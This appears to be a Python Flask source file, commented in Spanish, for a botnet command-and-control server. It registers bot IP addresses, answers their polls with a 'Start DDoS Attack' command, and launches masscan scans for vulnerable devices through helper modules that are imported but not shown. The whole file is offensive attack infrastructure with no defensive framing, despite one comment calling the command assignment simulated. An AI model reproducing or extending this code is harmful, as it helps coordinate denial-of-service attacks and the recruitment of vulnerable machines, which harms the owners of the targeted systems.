import threading
import requests
from flask import Flask, request
from bot.bot_utils import start_attack

app = Flask(__name__)

# Lista para almacenar las direcciones IP de los bots
bots = []

@app.route('/register', methods=['POST'])
def register_bot():
    bot_ip = request.form['ip']
    if bot_ip not in bots:
        bots.append(bot_ip)
        print(f"Bot {bot_ip} registrado exitosamente")
    return "Registro exitoso"

@app.route('/command', methods=['GET'])
def send_command():
    command = "No command"
    if bots:
        # Simulamos la asignación de comandos
        command = "Start DDoS Attack"
        print(f"Enviando comando: {command} a {len(bots)} bots.")
    return command

@app.route('/scan', methods=['GET'])
def scan_network():
    if bots:
        print("Iniciando escaneo de red...")
        # Lanzamos el escaneo de red (masscan) para buscar dispositivos vulnerables
        # Esto podría ser un comando o un script de escaneo lanzado en cada bot
        scan_results = mass_scan()
        return scan_results
    return "No bots disponibles para escaneo"

def mass_scan():
    # Aquí implementamos el comando de Masscan
    from scanner.masscan_scanner import perform_masscan
    return perform_masscan()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
